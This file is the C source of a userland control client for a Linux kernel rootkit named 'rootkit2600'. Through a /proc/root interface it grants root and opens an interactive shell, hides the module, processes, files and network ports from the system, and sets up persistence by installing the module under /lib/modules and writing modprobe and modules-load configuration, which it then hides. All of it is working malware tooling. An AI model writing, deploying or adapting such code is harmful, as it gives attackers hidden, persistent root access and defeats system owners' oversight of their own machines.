#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#define PROC_PATH "/proc/root"

static void usage(const char *prog)
{
    printf("usage: %s <command> [args]\n\n", prog);
    printf("  root             grant root to self\n");
    printf("  hide             hide the module\n");
    printf("  show             show the module\n");
    printf("  hideproc <pid>   hide process from /proc\n");
    printf("  clearprocs       clear all hidden pids\n");
    printf("  hidefile <name>  hide file by name (up to 16)\n");
    printf("  clearfiles       clear all hidden files\n");
    printf("  hideport <port>  hide tcp/udp port (up to 16)\n");
    printf("  clearports       clear all hidden ports\n");
    printf("  persist          setup persistence via modprobe\n");
}

static int send_cmd(const char *cmd)
{
    int fd;
    int ret;

    fd = open(PROC_PATH, O_WRONLY);
    if (fd < 0) {
        perror("open " PROC_PATH);
        return -1;
    }

    ret = write(fd, cmd, strlen(cmd));
    close(fd);
    return ret;
}


int main(int argc, char *argv[])
{
    char buf[256];

    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "root") == 0) {
        send_cmd("root");
        execl("/bin/sh", "sh", "-i", NULL);
        perror("execl");
        return 1;

    } else if (strcmp(argv[1], "hide") == 0) {
        send_cmd("hide");

    } else if (strcmp(argv[1], "show") == 0) {
        send_cmd("show");

    } else if (strcmp(argv[1], "hideproc") == 0) {
        if (argc < 3) { printf("missing pid\n"); return 1; }
        snprintf(buf, sizeof(buf), "hideproc:%s", argv[2]);
        send_cmd(buf);

    } else if (strcmp(argv[1], "clearprocs") == 0) {
        send_cmd("clearprocs");

    } else if (strcmp(argv[1], "hidefile") == 0) {
        if (argc < 3) { printf("missing filename\n"); return 1; }
        snprintf(buf, sizeof(buf), "hidefile:%s", argv[2]);
        send_cmd(buf);

    } else if (strcmp(argv[1], "clearfiles") == 0) {
        send_cmd("clearfiles");

    } else if (strcmp(argv[1], "hideport") == 0) {
        if (argc < 3) { printf("missing port\n"); return 1; }
        snprintf(buf, sizeof(buf), "hideport:%s", argv[2]);
        send_cmd(buf);

    } else if (strcmp(argv[1], "clearports") == 0) {
        send_cmd("clearports");

    } else if (strcmp(argv[1], "persist") == 0) {
        if (system("cp rootkit.ko /lib/modules/rootkit2600.ko") != 0) {
            printf("copy failed\n");
            return 1;
        }
        system("echo 'install rootkit2600 insmod /lib/modules/rootkit2600.ko'"
               " >> /etc/modprobe.d/r2600.conf");
        system("echo 'rootkit2600' >> /etc/modules-load.d/r2600.conf");
        /* vide la liste avant d'ajouter les deux fichiers a cacher */
        send_cmd("clearfiles");
        send_cmd("hidefile:r2600.conf");
        send_cmd("hidefile:rootkit2600.ko");
        printf("persistence setup done\n");

    } else {
        printf("unknown command: %s\n", argv[1]);
        usage(argv[0]);
        return 1;
    }

    return 0;
}
